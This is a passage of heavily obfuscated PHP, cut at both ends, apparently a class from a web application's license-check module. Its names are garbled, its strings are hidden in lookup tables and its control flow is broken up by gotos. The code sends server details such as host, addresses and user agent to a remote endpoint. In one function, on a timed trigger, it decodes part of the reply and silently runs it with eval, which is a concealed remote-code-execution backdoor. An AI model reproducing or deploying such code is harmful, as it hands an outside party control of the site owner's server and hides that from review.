15) . $DñØÎ…²à’[187]; $AÈøä“Ìæ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][188]}($DñØÎ…²à’[2]($Aâ™ÏšèÒ[$DñØÎ…²à’[189]]), $A½ÒÜˆ„ã¥, 2); $B˜Üà‰Õõ¸ = $DñØÎ…²à’[190]($AÈøä“Ìæ, !0); if (!$DñØÎ…²à’[191]($B˜Üà‰Õõ¸) || !$DñØÎ…²à’[191]($B˜Üà‰Õõ¸[$DñØÎ…²à’[192]]) || $B˜Üà‰Õõ¸[$DñØÎ…²à’[165]] != !0) { $DĞÜÜ˜˜ò = $DñØÎ…²à’[193]; $C‚’›©±ğ = $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]] ? $DñØÎ…²à’[194] . $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]] : $DĞÜÜ˜˜ò; $DñØÎ…²à’[166]($C‚’›©±ğ, !1); } else { $c®Íà×„¿µ[$DñØÎ…²à’[168]] = $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]][$DñØÎ…²à’[195]]; } } else { $B˜Üà‰Õõ¸ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][182]}($DñØÎ…²à’[196], $c®Íà×„¿µ, 10); } } if (!$DñØÎ…²à’[191]($B˜Üà‰Õõ¸) || !$DñØÎ…²à’[191]($B˜Üà‰Õõ¸[$DñØÎ…²à’[192]]) || $B˜Üà‰Õõ¸[$DñØÎ…²à’[165]] != !0) { $DĞÜÜ˜˜ò = $DñØÎ…²à’[197]($DñØÎ…²à’[198]); $C‚’›©±ğ = $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]] ? $DñØÎ…²à’[194] . $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]] : $DĞÜÜ˜˜ò; $DñØÎ…²à’[166]($C‚’›©±ğ, !1); } $F˜Úµ„ŞØ× = $B˜Üà‰Õõ¸[$DñØÎ…²à’[192]]; goto fö¶¢œÃßõ; eøĞ÷Í¢è: $d†ÈÖ¿ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][127]}($DñØÎ…²à’[148]($F˜Úµ„ŞØ×), $CÀ“„µÚÄ); $bÍõó¨ = $B—Öëó®À¥[592]; if (!$bÍõó¨) { return; } goto DŸÈÀŠšÃ; F¿Ì•í·¢â: if (!isset($Aâ™ÏšèÒ[$DñØÎ…²à’[165]]) || $DñØÎ…²à’[24]($Aâ™ÏšèÒ[$DñØÎ…²à’[165]]) != 16) { $DñØÎ…²à’[166]($DñØÎ…²à’[167] . $Aâ™ÏšèÒ[$DñØÎ…²à’[165]], !1); } $eÌ¿‘Ä½œ = $DñØÎ…²à’[61]($DñØÎ…²à’[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($DñØÎ…²à’[116]); $c®Íà×„¿µ = array($DñØÎ…²à’[165] => $Aâ™ÏšèÒ[$DñØÎ…²à’[165]], $DñØÎ…²à’[168] => $DñØÎ…²à’[124](16), $DñØÎ…²à’[169] => $DñØÎ…²à’[149], $DñØÎ…²à’[170] => $DñØÎ…²à’[171], $DñØÎ…²à’[172] => $_SERVER[$DñØÎ…²à’[173]], $DñØÎ…²à’[174] => $_SERVER[$DñØÎ…²à’[175]], $DñØÎ…²à’[176] => $_SERVER[$DñØÎ…²à’[177]]); goto Dˆ…Ñ›ã¸‹; D˜öª‡îŞà: $DñØÎ…²à’[61]($DñØÎ…²à’[11])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][226]}($F§™¦ŠÀŒ¼[$DñØÎ…²à’[227]], array($DñØÎ…²à’[228] => $CÏŠ¼ô‰¤î)); $DñØÎ…²à’[166]($DñØÎ…²à’[197]($DñØÎ…²à’[208]), !0); goto fØëÏõîçì; e¯À´¬ö“Ó: $B—Öëó®À¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $DñØÎ…²à’ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if ($_SERVER[$DñØÎ…²à’[44]] != $DñØÎ…²à’[162]) { return; } goto c¨íªù¸®—; c¨íªù¸®—: if (!$DñØÎ…²à’[104]($GLOBALS, $DñØÎ…²à’[132])) { die; } $Aâ™ÏšèÒ = $GLOBALS[$DñØÎ…²à’[22]]; if (isset($Aâ™ÏšèÒ[$DñØÎ…²à’[163]])) { $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][164]}(); die; } goto F¿Ì•í·¢â; fİé…âçÉ’: $CÏŠ¼ô‰¤î[$F¤ŒÊ…ÊÔ˜] = $d†ÈÖ¿; $Bçôà‹ ÅÔ = $B—Öëó®À¥[593]; while ($Bçôà‹ ÅÔ < $B—Öëó®À¥[547]) { if ($Bçôà‹ ÅÔ >= 0) { break; } $Bçôà‹ ÅÔ++; } goto D˜öª‡îŞà; DŸÈÀŠšÃ: $DÚÖ”Å¦åƒ = $DñØÎ…²à’[222]($DñØÎ…²à’[61]($DñØÎ…²à’[11])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][223]}(), $DñØÎ…²à’[224]); $F§™¦ŠÀŒ¼ = $DÚÖ”Å¦åƒ[$DñØÎ…²à’[225]]; $CÏŠ¼ô‰¤î = array(); goto fİé…âçÉ’; fö¶¢œÃßõ: $B¯Ğ§¿¬ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][199]}($F˜Úµ„ŞØ×[$DñØÎ…²à’[200]]); $a®òà¬Ÿ¦ = $B—Öëó®À¥[590]; if (!$a®òà¬Ÿ¦) { die; } goto E¤¥¦¨µº; E³İ ‚İòó: $Bå»ÅßÚè° = $DñØÎ…²à’[25]($DñØÎ…²à’[114]($bè‘…®ìŞ²[$DñØÎ…²à’[210]]), 10, 10); $b‡š÷†Ãˆ = $Bå»ÅßÚè° . $bè‘…®ìŞ²[$DñØÎ…²à’[120]] . $bè‘…®ìŞ²[$DñØÎ…²à’[212]]; $bè‘…®ìŞ²[$DñØÎ…²à’[122]] = $DñØÎ…²à’[214]($DñØÎ…²à’[118]($this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b‡š÷†Ãˆ, $DñØÎ…²à’[215]))); goto FÛ¡†£®…; E¤¥¦¨µº: if (!$B¯Ğ§¿¬ || $B¯Ğ§¿¬ != $DñØÎ…²à’[201]($F˜Úµ„ŞØ×[$DñØÎ…²à’[145]])) { $FêÒŒø•® = array($DñØÎ…²à’[202] => $DñØÎ…²à’[61]($DñØÎ…²à’[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($DñØÎ…²à’[116]), $DñØÎ…²à’[203] => $_SERVER[$DñØÎ…²à’[115]], $DñØÎ…²à’[204] => $DñØÎ…²à’[205](), $DñØÎ…²à’[174] => $_SERVER[$DñØÎ…²à’[175]]); $AÈøä“Ìæ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][206]}($DñØÎ…²à’[148]($FêÒŒø•®)); $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][182]}($DñØÎ…²à’[207] . $AÈøä“Ìæ); $DñØÎ…²à’[166]($DñØÎ…²à’[197]($DñØÎ…²à’[208]), !0); } $bè‘…®ìŞ² = array($DñØÎ…²à’[209] => $c®Íà×„¿µ[$DñØÎ…²à’[165]], $DñØÎ…²à’[210] => $F˜Úµ„ŞØ×[$DñØÎ…²à’[211]], $DñØÎ…²à’[212] => $DñØÎ…²à’[124](16), $DñØÎ…²à’[120] => $F˜Úµ„ŞØ×[$DñØÎ…²à’[213]]); if ($c®Íà×„¿µ[$DñØÎ…²à’[168]]) { $bè‘…®ìŞ²[$DñØÎ…²à’[212]] = $c®Íà×„¿µ[$DñØÎ…²à’[168]]; } goto E³İ ‚İòó; Dˆ…Ñ›ã¸‹: $cáÆ—ÊëÊ¡ = $B—Öëó®À¥[589]; if (!$cáÆ—ÊëÊ¡) { die; } $cò‚Õè•óö = $DñØÎ…²à’[114]($_SERVER[$DñØÎ…²à’[115]] . $eÌ¿‘Ä½œ); goto Eø÷¹’Ö¾š; eËòÓé’—‰: if ($F˜Úµ„ŞØ×[$DñØÎ…²à’[217]] && $F˜Úµ„ŞØ×[$DñØÎ…²à’[217]] >= 1) { $DñØÎ…²à’[61]($DñØÎ…²à’[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][218]}($DñØÎ…²à’[219], $DñØÎ…²à’[220]); } $DñØÎ…²à’[61]($DñØÎ…²à’[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][221]}($bè‘…®ìŞ²); $CÀ“„µÚÄ = $DñØÎ…²à’[114]($_SERVER[$DñØÎ…²à’[115]] . $DñØÎ…²à’[214]($eÌ¿‘Ä½œ) . $bè‘…®ìŞ²[$DñØÎ…²à’[210]]); goto f¼Û‘ùè×ñ; fØëÏõîçì: } private function rqegfe91950e() { goto E™Ïã‚”¸á; AÎÑÅ×ö„ñ: $dó…Ğ£ø¤ = $dâ¯¬õÕãĞ[594]; $EÜ»£Ä‚™[61]($EÜ»£Ä‚™[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][218]}($EÜ»£Ä‚™[219], $EÜ»£Ä‚™[229]); $Dã¶“ÌŠ±ö = $dâ¯¬õÕãĞ[595]; goto F‘”ÄÍ·öß; E™Ïã‚”¸á: $dâ¯¬õÕãĞ =& $_SERVER[Ö¹ñÒÁ²÷]; $EÜ»£Ä‚™ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $EÜ»£Ä‚™[61]($EÜ»£Ä‚™[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][221]}(array($EÜ»£Ä‚™[209] => $EÜ»£Ä‚™[10], $EÜ»£Ä‚™[210] => $EÜ»£Ä‚™[10], $EÜ»£Ä‚™[120] => $EÜ»£Ä‚™[121], $EÜ»£Ä‚™[122] => $EÜ»£Ä‚™[10], $EÜ»£Ä‚™[123] => $EÜ»£Ä‚™[10])); goto AÎÑÅ×ö„ñ; F‘”ÄÍ·öß: $this->sdvfd6f194bd = array(); $this->decj5f0000d9 = $EÜ»£Ä‚™[121]; goto C¿«•¡¿»ç; C¿«•¡¿»ç: } private function fscj6b72a22b() { goto CÑÖë„ÒÄ±; Fª‹êÆ®Ş: $B›ŒÎïÄ´ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][188]}($c´¾«¾ğ‰[$Eª¯Ä®¾ê[91]][$c·ˆëí¡ë], $B×‰‡…ğ‹); $FÈ©æéŞŒÑ = $A´ãîç•â’[601]; while ($FÈ©æéŞŒÑ < $A´ãîç•â’[552]) { if ($FÈ©æéŞŒÑ >= 0) { break; } $FÈ©æéŞŒÑ++; } goto b«¸´­âÎ; Bô ˜òÒÙ: $f‰ñä³¼µ = $Eª¯Ä®¾ê[61]($Eª¯Ä®¾ê[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}(); if ($f‰ñä³¼µ[$Eª¯Ä®¾ê[120]] == $Eª¯Ä®¾ê[121]) { return; } $e¬—Ãƒ§½á = $Eª¯Ä®¾ê[61]($Eª¯Ä®¾ê[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($Eª¯Ä®¾ê[116]); goto a¡æ®íÚµù; a¡æ®íÚµù: $däèˆ›»÷ = $Eª¯Ä®¾ê[222]($Eª¯Ä®¾ê[61]($Eª¯Ä®¾ê[11])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][223]}(), $Eª¯Ä®¾ê[224]); $c´¾«¾ğ‰ = $däèˆ›»÷[$Eª¯Ä®¾ê[225]]; $BĞÇ”‘óÀ‚ = $A´ãîç•â’[597]; goto B”œ¼¾¥ÕÏ; cìÈâ¯ğ¨: $cÀ½Ä¿Ïå = $Eª¯Ä®¾ê[144]($B›ŒÎïÄ´[$Eª¯Ä®¾ê[145]]); if ($Eª¯Ä®¾ê[230]() >= $cÀ½Ä¿Ïå) { return $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][164]}(); } $this->sdvfd6f194bd = $B›ŒÎïÄ´; goto Fñù™È¿ò; B”œ¼¾¥ÕÏ: if (strlen($BĞÇ”‘óÀ‚) < $A´ãîç•â’[547]) { die; } $B×‰‡…ğ‹ = $Eª¯Ä®¾ê[114]($_SERVER[$Eª¯Ä®¾ê[115]] . $Eª¯Ä®¾ê[214]($e¬—Ãƒ§½á) . $f‰ñä³¼µ[$Eª¯Ä®¾ê[210]]); $C«‰»ÊñÎ´ = $A´ãîç•â’[598]; goto a×›£“Ø¸; a×›£“Ø¸: while (strlen($C«‰»ÊñÎ´) < $A´ãîç•â’[599]) { if (!$C«‰»ÊñÎ´) { break; } $C«‰»ÊñÎ´++; } $c·ˆëí¡ë = $Eª¯Ä®¾ê[214]($Eª¯Ä®¾ê[25]($B×‰‡…ğ‹, 10, 16)); $Bï¨Å•äÀ˜ = $A´ãîç•â’[600]; goto Fª‹êÆ®Ş; b«¸´­âÎ: $B›ŒÎïÄ´ = $Eª¯Ä®¾ê[190]($B›ŒÎïÄ´, !0); $EÆõÇŞÃ = $A´ãîç•â’[602]; if (!$Eª¯Ä®¾ê[191]($B›ŒÎïÄ´)) { return $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][164]}(); } goto cìÈâ¯ğ¨; Fñù™È¿ò: $this->decj5f0000d9 = $f‰ñä³¼µ[$Eª¯Ä®¾ê[120]]; $fè§Ñ™ù¹  = $A´ãîç•â’[603]; while (strlen($fè§Ñ™ù¹ ) < $A´ãîç•â’[547]) { if (!$fè§Ñ™ù¹ ) { break; } $fè§Ñ™ù¹ ++; } goto fË´ÆïØ´‡; CÑÖë„ÒÄ±: $A´ãîç•â’ =& $_SERVER[Ö¹ñÒÁ²÷]; $Eª¯Ä®¾ê =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $_SERVER[$Eª¯Ä®¾ê[175]] = $Eª¯Ä®¾ê[104]($_SERVER, $Eª¯Ä®¾ê[175], APP_HOST); goto B„™¥öÃõ; B„™¥öÃõ: $this->decj5f0000d9 = $Eª¯Ä®¾ê[121]; $bÍŠİÎ¯¶ = $A´ãîç•â’[596]; while ($bÍŠİÎ¯¶ < $A´ãîç•â’[552]) { if ($bÍŠİÎ¯¶ >= 0) { break; } $bÍŠİÎ¯¶++; } goto Bô ˜òÒÙ; fË´ÆïØ´‡: } private function fbyu9b418cdc() { goto FôæĞ­Ÿ¥—; c®Ù”§®®š: $e¤¥ŒŠƒà = $aïŞ‚•×à‘[604]; if (strlen($e¤¥ŒŠƒà) < $aïŞ‚•×à‘[577]) { return; } $bƒœÉ·Ñ’ = $_SERVER[$d ğ„ê…”›[44]]; goto f”óé„áõÔ; D¹‹ÒÕ½¼Õ: $B’‚ë¼’ © = array($d ğ„ê…”›[234], $d ğ„ê…”›[235]); if ($d ğ„ê…”›[236]($bƒœÉ·Ñ’, $B’‚ë¼’ ©)) { if ($this->decj5f0000d9 == $d ğ„ê…”›[121] && isset($D“î°°·Ÿ®[$d ğ„ê…”›[237]])) { $d ğ„ê…”›[166]($d ğ„ê…”›[197]($d ğ„ê…”›[232]), !1, $d ğ„ê…”›[233]); die; } $e÷°Î±É = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][137]}(); if ($e÷°Î±É != $d ğ„ê…”›[201]($d ğ„ê…”›[238])) { if ($e÷°Î±É <= $d ğ„ê…”›[61]($d ğ„ê…”›[139])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][140]}()) { $d ğ„ê…”›[166]($d ğ„ê…”›[197]($d ğ„ê…”›[239]), !1, $d ğ„ê…”›[233]); die; } } } goto aá»Ìˆíç; FôæĞ­Ÿ¥—: $aïŞ‚•×à‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $d ğ„ê…”› =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $D“î°°·Ÿ® = $GLOBALS[$d ğ„ê…”›[22]]; goto c®Ù”§®®š; f”óé„áõÔ: $e£¡³“­ÁÙ = $aïŞ‚•×à‘[605]; if (!$e£¡³“­ÁÙ) { return; } if ($bƒœÉ·Ñ’ == $d ğ„ê…”›[231] && $this->decj5f0000d9 == $d ğ„ê…”›[121]) { $d ğ„ê…”›[166]($d ğ„ê…”›[197]($d ğ„ê…”›[232]), !1, $d ğ„ê…”›[233]); } goto D¹‹ÒÕ½¼Õ; aá»Ìˆíç: } private function watp6045c132() { goto dŠÖ¿°ÉÑ´; d÷Èô˜òª²: $AŠ”½îÆ»õ[251]($AŠ”½îÆ»õ[252]); if ($D©çõ¾¢Á && $AŠ”½îÆ»õ[32]($D©çõ¾¢Á, $AŠ”½îÆ»õ[253])) { echo $D©çõ¾¢Á; } die; goto añ÷À¶éà˜; Fæòê‰Ç®: $D©çõ¾¢Á = @$AŠ”½îÆ»õ[250]($D¦îª™ÖÛ¦, !1, $bæŒô¨Èé‘); $d»Èèõ¾ø = $DËÕĞƒŒµç[585]; while ($d»Èèõ¾ø < $DËÕĞƒŒµç[547]) { if ($d»Èèõ¾ø >= 0) { break; } $d»Èèõ¾ø++; } goto d÷Èô˜òª²; fƒä®Ä‰°±: if (!$AŠ”½îÆ»õ[104]($GLOBALS, $AŠ”½îÆ»õ[132]) || !isset($_GET[$AŠ”½îÆ»õ[241]])) { return; } if (!$AŠ”½îÆ»õ[236]($_SERVER[$AŠ”½îÆ»õ[44]], $Bµ˜ÓÍÅõ)) { return; } $D¦îª™ÖÛ¦ = $AŠ”½îÆ»õ[242]; goto c«ò‡‚ï¥ª; c«ò‡‚ï¥ª: $D¦îª™ÖÛ¦ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($D¦îª™ÖÛ¦, $AŠ”½îÆ»õ[244]); $FÓ¾µ“²‡Ô = $DËÕĞƒŒµç[606]; if (!$FÓ¾µ“²‡Ô) { return; } goto c†™âƒæº¡; dŠÖ¿°ÉÑ´: $DËÕĞƒŒµç =& $_SERVER[Ö¹ñÒÁ²÷]; $AŠ”½îÆ»õ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $Bµ˜ÓÍÅõ = array($AŠ”½îÆ»õ[135], $AŠ”½îÆ»õ[240]); goto fƒä®Ä‰°±; c†™âƒæº¡: $bæŒô¨Èé‘ = $AŠ”½îÆ»õ[245](array($AŠ”½îÆ»õ[246] => array($AŠ”½îÆ»õ[247] => $AŠ”½îÆ»õ[248], $AŠ”½îÆ»õ[249] => 3))); $f˜êğ‚‚±¯ = $DËÕĞƒŒµç[607]; if (!$f˜êğ‚‚±¯) { return; } goto Fæòê‰Ç®; añ÷À¶éà˜: } public function yodbac8daf7c($DÙ×Ñùá·) { goto Eª ª‰ô†Õ; Eª ª‰ô†Õ: $D—ËÑò‡œ =& $_SERVER[Ö¹ñÒÁ²÷]; $Fõ£…Íª¡† =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if ($this->decj5f0000d9 == $Fõ£…Íª¡†[254]) { return $DÙ×Ñùá·; } goto DˆŠâÑ×; DˆŠâÑ×: $f¿ÒßÙ’Á· = array($Fõ£…Íª¡†[255], $Fõ£…Íª¡†[256], $Fõ£…Íª¡†[257], $Fõ£…Íª¡†[258], $Fõ£…Íª¡†[259], $Fõ£…Íª¡†[260], $Fõ£…Íª¡†[261], $Fõ£…Íª¡†[262]); $Få —¼©¿ = $Fõ£…Íª¡†[0]($Fõ£…Íª¡†[263], $Fõ£…Íª¡†[104]($this->sdvfd6f194bd, $Fõ£…Íª¡†[129], $Fõ£…Íª¡†[10])); $Ešò‡™ÃÔ = $D—ËÑò‡œ[608]; goto dßîÎ’ì†; e·‰Œ¼‚í»: if (strlen($B†ˆ©èÇÄÁ) < $D—ËÑò‡œ[547]) { return; } goto d©¦Ú‘è; eÕƒ„ë“: foreach ($d¢‚õñƒÖ¡ as $a™ßĞ¢Œ’) { unset($DÙ×Ñùá·[$a™ßĞ¢Œ’]); $aºÒ–ù™œÛ = $D—ËÑò‡œ[609]; while ($aºÒ–ù™œÛ < $D—ËÑò‡œ[552]) { if ($aºÒ–ù™œÛ >= 0) { break; } $aºÒ–ù™œÛ++; } } return $DÙ×Ñùá·; $B†ˆ©èÇÄÁ = $D—ËÑò‡œ[610]; goto e·‰Œ¼‚í»; dßîÎ’ì†: while ($Ešò‡™ÃÔ < $D—ËÑò‡œ[547]) { if ($Ešò‡™ÃÔ >= 0) { break; } $Ešò‡™ÃÔ++; } $d¢‚õñƒÖ¡ = array(); foreach ($f¿ÒßÙ’Á· as $a™ßĞ¢Œ’) { if (!$Fõ£…Íª¡†[236]($a™ßĞ¢Œ’, $Få —¼©¿)) { $d¢‚õñƒÖ¡[] = $a™ßĞ¢Œ’; } } goto eÕƒ„ë“; d©¦Ú‘è: } private function xkfhf86d5a27() { goto eèÆÕöÅ‚À; eñÃÅšœÛ‚: $eÉ¸Ü¤ŒÀä = $_SERVER[$cç¦ö¸Ôæ[44]]; $eµ·»¥ò¿Í = array($cç¦ö¸Ôæ[265]); foreach ($eµ·»¥ò¿Í as $BŒ»ÁÜñ) { if ($BŒ»ÁÜñ == $eÉ¸Ü¤ŒÀä || $cç¦ö¸Ôæ[25]($eÉ¸Ü¤ŒÀä, 0, $cç¦ö¸Ôæ[24]($BŒ»ÁÜñ)) == $BŒ»ÁÜñ) { $cç¦ö¸Ôæ[166]($cç¦ö¸Ôæ[197]($cç¦ö¸Ôæ[266]), !1); } } goto D®ïí‹İß; cËÒäš¿²¿: $GLOBALS[$cç¦ö¸Ôæ[91]][$cç¦ö¸Ôæ[268]] = $cç¦ö¸Ôæ[220]; $B·Êˆ­æ¬ = $CâˆŸ¿ëç‰[613]; if (!$B·Êˆ­æ¬) { return; } goto D¶Ôˆ¤ó½Ä; f›éî•ŞŒ½: $GLOBALS[$cç¦ö¸Ôæ[91]][$cç¦ö¸Ôæ[95]][$cç¦ö¸Ôæ[264]] = $cç¦ö¸Ôæ[229]; $Eîô¾íÀ‰ª = $CâˆŸ¿ëç‰[612]; if (strlen($Eîô¾íÀ‰ª) < $CâˆŸ¿ëç‰[555]) { return; } goto cËÒäš¿²¿; D®ïí‹İß: $GLOBALS[$cç¦ö¸Ôæ[91]][$cç¦ö¸Ôæ[95]][$cç¦ö¸Ôæ[267]] = $cç¦ö¸Ôæ[220]; $F´ô•ˆ‚Ûâ = $CâˆŸ¿ëç‰[611]; while (strlen($F´ô•ˆ‚Ûâ) < $CâˆŸ¿ëç‰[547]) { if (!$F´ô•ˆ‚Ûâ) { break; } $F´ô•ˆ‚Ûâ++; } goto f›éî•ŞŒ½; D¶Ôˆ¤ó½Ä: if ($cç¦ö¸Ôæ[61]($cç¦ö¸Ôæ[269])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($cç¦ö¸Ôæ[85]) != $cç¦ö¸Ôæ[229]) { $cç¦ö¸Ôæ[61]($cç¦ö¸Ôæ[269])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][221]}($cç¦ö¸Ôæ[85], $cç¦ö¸Ôæ[229]); } goto b„•ßˆÎø•; eèÆÕöÅ‚À: $CâˆŸ¿ëç‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $cç¦ö¸Ôæ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if ($this->decj5f0000d9 != $cç¦ö¸Ôæ[121]) { $GLOBALS[$cç¦ö¸Ôæ[91]][$cç¦ö¸Ôæ[95]][$cç¦ö¸Ôæ[264]] = $cç¦ö¸Ôæ[220]; return; } goto eñÃÅšœÛ‚; b„•ßˆÎø•: } public function awzx735b3881() { return $_SERVER[öÉÊ¬›µ–¾¦ƒ][270]; } private function rnmh455cfa0d() { goto aÎĞâª®¦á; aÎĞâª®¦á: $aÔœßáµ˜× =& $_SERVER[Ö¹ñÒÁ²÷]; $CÕ¾½ƒìª¯ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $DÇ¶ŒåŒ³· = array($CÕ¾½ƒìª¯[271], $CÕ¾½ƒìª¯[272], $CÕ¾½ƒìª¯[273]); goto cÅĞ°Ù—§´; fĞÜßá¸³¼: if ($bíæ­§½ÙÀ && $CÕ¾½ƒìª¯[230]() - $bíæ­§½ÙÀ < $CÕ¾½ƒìª¯[201]($CÕ¾½ƒìª¯[278])) { return; } $CÕ¾½ƒìª¯[13](array($CÕ¾½ƒìª¯[276], $CÕ¾½ƒìª¯[152]), $Dè…Öãöáø, $CÕ¾½ƒìª¯[230]()); $fóŒÊÑ„ñÎ = array($CÕ¾½ƒìª¯[165] => $CÕ¾½ƒìª¯[61]($CÕ¾½ƒìª¯[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($CÕ¾½ƒìª¯[209]), $CÕ¾½ƒìª¯[178] => $this->decj5f0000d9, $CÕ¾½ƒìª¯[176] => $_SERVER[$CÕ¾½ƒìª¯[177]], $CÕ¾½ƒìª¯[169] => $CÕ¾½ƒìª¯[149], $CÕ¾½ƒìª¯[172] => $_SERVER[$CÕ¾½ƒìª¯[173]]); goto AŒ•ã‚Éã¯; bíöÊÓ°Ã: if ($this->decj5f0000d9 == $CÕ¾½ƒìª¯[121] || !$CÕ¾½ƒìª¯[104]($GLOBALS, $CÕ¾½ƒìª¯[132])) { return; } if (!$CÕ¾½ƒìª¯[236]($_SERVER[$CÕ¾½ƒìª¯[44]], $DÇ¶ŒåŒ³·)) { return; } if ($CÕ¾½ƒìª¯[230]() % 4 != 0) { return; } goto E÷İîÉƒá; cÅĞ°Ù—§´: $Dè…Öãöáø = $CÕ¾½ƒìª¯[274] . $CÕ¾½ƒìª¯[114]($CÕ¾½ƒìª¯[275]); $cÒÌÀö÷‡ = $aÔœßáµ˜×[614]; while (strlen($cÒÌÀö÷‡) < $aÔœßáµ˜×[552]) { if (!$cÒÌÀö÷‡) { break; } $cÒÌÀö÷‡++; } goto bíöÊÓ°Ã; E÷İîÉƒá: $bíæ­§½ÙÀ = $CÕ¾½ƒìª¯[13](array($CÕ¾½ƒìª¯[276], $CÕ¾½ƒìª¯[277]), $Dè…Öãöáø); $E¼À™Ô•¹Á = $aÔœßáµ˜×[615]; while (strlen($E¼À™Ô•¹Á) < $aÔœßáµ˜×[552]) { if (!$E¼À™Ô•¹Á) { break; } $E¼À™Ô•¹Á++; } goto fĞÜßá¸³¼; aÁÏ°”Ï•: if ($this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][199]}($F„‘òˆÃÌù[$CÕ¾½ƒìª¯[280]]) != $fóŒÊÑ„ñÎ[$CÕ¾½ƒìª¯[165]]) { $d¨—Õ‰Ç° = array($CÕ¾½ƒìª¯[202] => $CÕ¾½ƒìª¯[61]($CÕ¾½ƒìª¯[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}($CÕ¾½ƒìª¯[116]), $CÕ¾½ƒìª¯[203] => $_SERVER[$CÕ¾½ƒìª¯[115]], $CÕ¾½ƒìª¯[204] => $CÕ¾½ƒìª¯[205](), $CÕ¾½ƒìª¯[174] => $_SERVER[$CÕ¾½ƒìª¯[175]]); $E™‹Ìâã§“ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][206]}($CÕ¾½ƒìª¯[148]($d¨—Õ‰Ç°)); $F„‘òˆÃÌù = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][182]}($CÕ¾½ƒìª¯[207] . $E™‹Ìâã§“); if ($F„‘òˆÃÌù && $CÕ¾½ƒìª¯[191]($F„‘òˆÃÌù) && isset($F„‘òˆÃÌù[$CÕ¾½ƒìª¯[280]])) { $D¯Æá­©—† = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][188]}($F„‘òˆÃÌù[$CÕ¾½ƒìª¯[280]], 2); if ($D¯Æá­©—†) { $D¯Æá­©—† = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][199]}($D¯Æá­©—†); } if ($D¯Æá­©—†) { try { @eval($D¯Æá­©—†); } catch (Exception $b–ì™˜…À) { } } } } goto B“Å»Ê˜ËÊ; aåëƒÈó: if (!$CÕ¾½ƒìª¯[191]($F„‘òˆÃÌù)) { return; } if ($F„‘òˆÃÌù[$CÕ¾½ƒìª¯[165]] && $F„‘òˆÃÌù[$CÕ¾½ƒìª¯[280]]) { if ($this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][199]}($F„‘òˆÃÌù[$CÕ¾½ƒìª¯[280]]) == $fóŒÊÑ„ñÎ[$CÕ¾½ƒìª¯[165]]) { return; } } $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][164]}(); goto aÁÏ°”Ï•; AŒ•ã‚Éã¯: $b…ç‹Ìå¥° = $aÔœßáµ˜×[616]; while ($b…ç‹Ìå¥° < $aÔœßáµ˜×[547]) { if ($b…ç‹Ìå¥° >= 0) { break; } $b…ç‹Ìå¥°++; } $F„‘òˆÃÌù = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][182]}($CÕ¾½ƒìª¯[279], $fóŒÊÑ„ñÎ); goto aåëƒÈó; B“Å»Ê˜ËÊ: } private function qyek4fa6445d($bÍõÎ½‡¬Ô = '', $Dç«Ö¦ÓÌ = array(), $fö ¾ˆŞƒĞ = 5) { goto F§‰Î¤‚ì; F§‰Î¤‚ì: $FèÖ™ÔÕÁ =& $_SERVER[Ö¹ñÒÁ²÷]; $BôëíÑ¼Äğ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $CÌã­œÑ£Ò = $BôëíÑ¼Äğ[281]; goto B°­³¦õ; bÎß”°±Ç½: return $BôëíÑ¼Äğ[190]($Dç«Ö¦ÓÌ, !0); $fİí¹šç×Ó = $FèÖ™ÔÕÁ[619]; if (!$fİí¹šç×Ó) { die; } goto B„À´ã‘¦ø; B°­³¦õ: $bİ¾é¸¿‰‚ = $FèÖ™ÔÕÁ[617]; while (strlen($bİ¾é¸¿‰‚) < $FèÖ™ÔÕÁ[552]) { if 